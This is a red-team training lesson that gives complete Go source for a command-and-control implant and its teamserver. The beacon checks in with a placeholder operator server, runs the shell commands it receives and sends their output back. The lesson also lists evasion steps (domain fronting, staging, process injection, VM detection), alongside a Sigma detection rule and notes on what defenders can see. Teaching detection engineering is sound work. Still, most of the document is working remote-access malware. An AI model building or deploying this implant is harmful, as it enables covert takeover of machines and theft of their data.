---
title: "Custom Implant Development — Go HTTP C2 Beacon, Sleep Jitter, Detection Engineering"
tags: [implant-development, c2, red-team, go, evasion, detection, module-12-postghost]
module: 12-PostGhostLevel
day: 742
prerequisites:
  - Day 496 — Payload Development
  - Day 519 — Advanced Evasion and AV Bypass
related_topics:
  - Day 743 — Writing Security Research Papers
---

# Day 742 — Custom Implant Development

> "Metasploit meterpreter is known to every EDR. Cobalt Strike is known to every
> threat intelligence feed. Sliver is increasingly fingerprinted. If you are on
> a red team engagement where detection evasion matters, you will eventually
> need to write your own. This lesson teaches you what your own implant needs to
> do — and more importantly, what detection it produces, so you understand what
> a defender sees when you run it."
>
> — Ghost

---

## Goals

Build a minimal working Go HTTP C2 implant. Implement sleep jitter for
anti-detection. Understand the detection signatures your implant produces
and how a defender would write rules against it. Complete the red team
feedback loop: build it, detect it, improve it.

**Prerequisites:** Days 496, 519.
**Estimated study time:** 4 hours (code-heavy).

---

## 1 — Implant Architecture

```
MINIMAL C2 IMPLANT COMPONENTS

Implant (runs on target):
  1. Check-in          → periodic HTTP(S) beacon to C2 server
  2. Command execution → execute operator commands, return output
  3. Persistence       → maintain access across reboots (optional)
  4. Evasion           → anti-analysis, sleep jitter, process injection

Teamserver (operator controls):
  1. Listener          → HTTP/HTTPS handler for beacons
  2. Task queue        → store pending commands per implant
  3. Output store      → collect and display command results

Communication:
  Protocol:  HTTPS (TLS 1.3, valid certificate preferred)
  Format:    JSON body, base64-encoded output
  Frequency: Variable (base interval + ±jitter%)
  Direction: Implant always initiates (pull model, no inbound connections)
```

---

## 2 — Minimal Go HTTP Implant

### 2.1 Implant Code

```go
// implant/main.go — Minimal Go C2 beacon
// Build: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o beacon.exe .
// Build: GOOS=linux   GOARCH=amd64 go build -ldflags="-s -w" -o beacon .

package main

import (
    "bytes"
    "crypto/tls"
    "encoding/base64"
    "encoding/json"
    "fmt"
    "math/rand"
    "net/http"
    "os/exec"
    "runtime"
    "time"
)

const (
    C2URL       = "https://[TEAMSERVER_IP]/beacon"   // replace with your server
    SLEEP_BASE  = 30 * time.Second
    JITTER_PCT  = 30  // ±30% of base sleep
    IMPLANT_ID  = "beacon-001"
)

// CheckIn sends a heartbeat and receives a task (if any).
type CheckInRequest struct {
    ID       string `json:"id"`
    Hostname string `json:"hostname"`
    OS       string `json:"os"`
    Arch     string `json:"arch"`
}

type CheckInResponse struct {
    Task    string `json:"task,omitempty"`    // shell command to run
    TaskID  string `json:"task_id,omitempty"`
}

type TaskResult struct {
    ImplantID string `json:"implant_id"`
    TaskID    string `json:"task_id"`
    Output    string `json:"output"` // base64-encoded
}

// jitteredSleep sleeps for base ± jitter_pct percent
func jitteredSleep(base time.Duration, pct int) {
    jitter := float64(base) * (float64(rand.Intn(pct*2+1)-pct) / 100.0)
    time.Sleep(base + time.Duration(jitter))
}

// checkin sends heartbeat; returns task if available
func checkin(client *http.Client) (*CheckInResponse, error) {
    req := CheckInRequest{
        ID:       IMPLANT_ID,
        Hostname: hostname(),
        OS:       runtime.GOOS,
        Arch:     runtime.GOARCH,
    }
    body, _ := json.Marshal(req)
    resp, err := client.Post(C2URL, "application/json", bytes.NewReader(body))
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    var task CheckInResponse
    json.NewDecoder(resp.Body).Decode(&task)
    return &task, nil
}

// executeTask runs a shell command; returns output (truncated at 64KB)
func executeTask(task string) string {
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd.exe", "/C", task)
    } else {
        cmd = exec.Command("/bin/sh", "-c", task)
    }
    out, err := cmd.CombinedOutput()
    if err != nil {
        out = append(out, []byte(fmt.Sprintf("\n[error: %v]", err))...)
    }
    if len(out) > 65536 {
        out = out[:65536]
    }
    return base64.StdEncoding.EncodeToString(out)
}

// sendResult posts the task output back to the C2
func sendResult(client *http.Client, taskID, output string) {
    result := TaskResult{
        ImplantID: IMPLANT_ID,
        TaskID:    taskID,
        Output:    output,
    }
    body, _ := json.Marshal(result)
    client.Post(C2URL+"/result", "application/json", bytes.NewReader(body))
}

func hostname() string {
    // In production: use os.Hostname()
    return "TARGET-HOST"
}

func main() {
    // Skip TLS verification for lab — in production: use a valid cert
    transport := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: transport, Timeout: 15 * time.Second}

    for {
        task, err := checkin(client)
        if err == nil && task != nil && task.Task != "" {
            output := executeTask(task.Task)
            sendResult(client, task.TaskID, output)
        }
        jitteredSleep(SLEEP_BASE, JITTER_PCT)
    }
}
```

### 2.2 Minimal Teamserver

```go
// teamserver/main.go — minimal HTTP C2 handler
package main

import (
    "encoding/base64"
    "encoding/json"
    "fmt"
    "net/http"
    "sync"
)

var (
    tasks   = make(map[string]string)  // implantID → pending task
    results = make(map[string]string)  // taskID    → output
    mu      sync.Mutex
)

func beaconHandler(w http.ResponseWriter, r *http.Request) {
    var req struct {
        ID string `json:"id"`
    }
    json.NewDecoder(r.Body).Decode(&req)

    mu.Lock()
    task, ok := tasks[req.ID]
    taskID := ""
    if ok {
        taskID = fmt.Sprintf("task-%d", len(results)+1)
        delete(tasks, req.ID)
    }
    mu.Unlock()

    json.NewEncoder(w).Encode(map[string]string{
        "task": task, "task_id": taskID,
    })
}

func resultHandler(w http.ResponseWriter, r *http.Request) {
    var res struct {
        ImplantID string `json:"implant_id"`
        TaskID    string `json:"task_id"`
        Output    string `json:"output"`
    }
    json.NewDecoder(r.Body).Decode(&res)
    out, _ := base64.StdEncoding.DecodeString(res.Output)

    mu.Lock()
    results[res.TaskID] = string(out)
    mu.Unlock()

    fmt.Printf("[+] %s → %s\n%s\n", res.ImplantID, res.TaskID, string(out))
    w.WriteHeader(http.StatusOK)
}

func main() {
    http.HandleFunc("/beacon", beaconHandler)
    http.HandleFunc("/beacon/result", resultHandler)
    fmt.Println("[*] Teamserver listening on :8443")
    http.ListenAndServeTLS(":8443", "server.crt", "server.key", nil)
}
```

---

## 3 — Detection Signatures Your Implant Produces

This is the part most red teamers skip. You must understand what you leave
behind before you run this in a real engagement.

```
DETECTION SURFACE OF THE ABOVE IMPLANT

NETWORK:
  - Periodic HTTPS POST to same IP every ~30 seconds (± jitter)
    → Sigma: unusual_periodic_outbound_https_post
    → Network anomaly: beaconing interval consistent with ±30% base
  - Same source process initiating repeated connections (if not browser)
    → Zeek: conn.log shows high connection count to single dest
  - No Accept-Language, User-Agent headers (Go http.Client defaults are bare)
    → Proxy log: suspicious User-Agent absence or "Go-http-client/2.0"
    → Fix: set realistic User-Agent header in client

PROCESS:
  - Unknown executable spawning cmd.exe / /bin/sh (process tree anomaly)
    → Sysmon Event ID 1: parent process = beacon.exe, child = cmd.exe
    → Sigma: suspicious_process_creation_unusual_parent
  - Binary not signed (no Authenticode signature)
    → EDR: unsigned PE executing from temp directory

MEMORY (if EDR does memory scanning):
  - Go binary: recognisable Go runtime strings (runtime.*, reflect.*)
    → YARA rule: detect Go runtime + HTTP client patterns
  - Not packed: string "application/json" visible in binary

DISK:
  - Binary written to %APPDATA% or %TEMP% without installation context
  - File has no version info, no company name, no description

FIXES TO REDUCE DETECTION:
  1. Add realistic HTTP headers (User-Agent, Accept, Accept-Language)
  2. Use domain fronting or redirectors — C2 IP hidden behind CDN
  3. Stage the beacon: first stage is small, downloads actual payload
  4. Strip Go runtime symbols (already done with -ldflags="-s -w")
  5. Add process injection to avoid running directly as beacon.exe
  6. Add anti-analysis checks before connecting (VM detection)
```

---

## 4 — Writing Detection Rules for Your Own Implant

```yaml
# Sigma rule: detect Go-based beacon HTTP POST pattern
title: Suspicious Go HTTP Client Beaconing
id: b8c4d7e2-3f5a-4b6c-9d0e-1f2a3b4c5d6e
status: experimental
description: >
  Detects periodic HTTPS POST requests from non-browser processes consistent
  with a Go HTTP C2 beacon. Fires on Go-http-client User-Agent or missing UA.
logsource:
  product: zeek
  service: http
detection:
  selection_ua:
    user_agent|contains:
      - 'Go-http-client'
      - 'Go-http-client/1.1'
      - 'Go-http-client/2.0'
  filter_legit:
    uri_path|contains:
      - '/update'       # legitimate Go-based updaters
  condition: selection_ua and not filter_legit
falsepositives:
  - Legitimate Go applications making HTTP requests
level: medium
tags:
  - attack.command_and_control
  - attack.t1071.001
```

---

## Key Takeaways

1. **Write your own implant at least once** — not because you'll use it over
   commercial tools on every engagement, but because it forces you to understand
   every detection surface the implant creates.
2. **Sleep jitter alone is not anti-detection.** The beaconing pattern, User-Agent,
   unsigned binary, and process parentage are all simultaneously visible to a
   properly instrumented SOC.
3. **The feedback loop is: build → detect → improve.** Every improvement you make
   to your implant teaches you one more thing that defenders should be looking for.
4. **Never run a custom implant on a real engagement target without understanding
   every detection surface it creates.** Detonating an unknown implant in a
   monitored environment is a gift to the blue team.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q742.1, Q742.2 …).

---

## Navigation

← Previous: [Day 741 — Browser Security and V8 Research](DAY-0741-Browser-Security-V8-Research.md)
→ Next: [Day 743 — Writing Security Research Papers](DAY-0743-Writing-Security-Research-Papers.md)
